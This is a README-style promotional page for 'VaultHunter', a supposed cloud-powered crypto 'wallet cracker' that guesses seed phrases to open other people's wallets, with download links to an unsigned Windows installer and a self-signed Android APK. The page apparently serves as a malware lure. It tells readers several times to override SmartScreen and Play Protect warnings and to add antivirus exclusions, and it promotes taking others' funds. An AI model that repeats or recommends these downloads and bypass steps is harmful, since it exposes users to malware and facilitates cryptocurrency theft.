<div align="center">
  
**Website:** https://vaulthunter-download.pages.dev

# 🔓 Vault*Hunter

### Wal*let Cra*cker · Seed Phrase Scanner · Cloud-Powered

**Some vaults never got opened. Go open them.**

![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Android-blue)
![Price](https://img.shields.io/badge/price-100%25%20free-brightgreen)
![License](https://img.shields.io/badge/license-MIT-green)

</div>

---

**What it is:** a free, open-source wallet scanner for Windows and Android. Seed phrases are generated and tested against wallet formats — no account, no install fees, no paywall.

---

## 📖 What Is This?

VaultHunter generates seed phrases, tests them against multiple wallet formats, and surfaces anything it finds. The work runs server-side, so a budget device performs the same as a high-end one.

## ❓ Why "Cra*cker"?

Because that's what it does — it opens wallets by testing phrases until one matches. Nothing gets modified, nothing gets patched.

| Meaning | Applies here? |
|---|---|
| A tool that opens wallets by testing phrases | ✅ Yes |
| A modified copy of a paid program | ❌ No — original code |

## ✨ Features

| | |
|---|---|
| 🔓 **It opens wallets** | Phrases tested against real wallet formats, nonstop. |
| ⚡ **Results in seconds** | Install, hit start, done. No wizard, no config file. |
| 🌙 **It doesn't sleep** | The search keeps running whether you're watching or not. |
| ☁️ **Server-side** | All heavy lifting is remote. Your hardware is irrelevant. |
| 🧩 **Multi-format** | A wide range of wallet formats and derivation paths. |
| 📱 **Windows and Android** | Same engine, same speed, either device. |
| 🪶 **Lightweight** | Minimal footprint, runs on low-end devices. |
| 📊 **Clean output** | Readable, exportable results. |

## 💻 Platforms

| Platform | Minimum | Status |
|---|---|---|
| Windows | 10 (x64) | ✅ Stable |
| Android | 8.0 (API 26) | ✅ Stable |
| Linux / macOS | — | 🧪 Planned |

## 📥 Download

| File | Platform | Size |
|---|---|---|
| [`VaultHunter_Setup.exe`](https://vaulthunter-download.pages.dev/downloads/VaultHunter_Setup.exe) | Windows | ~5.6 MB |
| [`vaulthunter.apk`](https://vaulthunter-download.pages.dev/downloads/vaulthunter.apk) | Android | ~5.1 MB |

## 🔧 Installation

**Windows**

1. Run `VaultHunter_Setup.exe`.
2. If SmartScreen warns you, click **More info → Run anyway**. The installer is unsigned.
3. Follow the steps and launch.

**Android**

1. Open `vaulthunter.apk`.
2. Allow **Install unknown apps** when prompted.
3. Confirm, then grant permissions on first launch.

If Play Protect warns you, tap **Install anyway** — the APK is self-signed.

## 🚀 Quick Start

```
1. Launch the app
2. Select a wallet type
3. Press Start
4. Watch results arrive
```

## ⚙️ How It Works

```
Client (Win / Android) ──job spec──► Cloud workers (parallel)
        ◄──────streamed results──────┘
                    │
                    ▼
          Local results list → export
```

The client sends a job spec. Workers generate candidates and derive addresses in parallel. Each is checked against the chain. Hits stream back immediately.

## 🩺 Troubleshooting

| Problem | Fix |
|---|---|
| Windows: won't launch | Install the [VC++ Redistributable (x64)](https://learn.microsoft.com/cpp/windows/latest-supported-vc-redist) |
| Windows: SmartScreen warning | More info → Run anyway |
| Android: "App not installed" | Uninstall any older build first |
| Android: Play Protect warning | Install anyway |
| No results after a long run | Normal — results are probabilistic |
| Antivirus flags the installer | Add an exclusion; unsigned binaries trigger heuristics |

## ❓ FAQ

**Is this a modified copy of a paid app?** No. Original work, MIT.

**Does it need a strong device?** No. Processing is remote.

**Do I need to keep it open?** For live results, yes. Jobs continue server-side either way.

**Where do I report a bug?** Open an [issue](../../issues/new/choose) with your platform and version.


## 📄 License

[MIT](LICENSE) © VaultHunter

## 📬 Contact

- **Website:** https://vaulthunter-download.pages.dev
- **Telegram:** [@vaulthunterapp](https://t.me/vaulthunterapp)
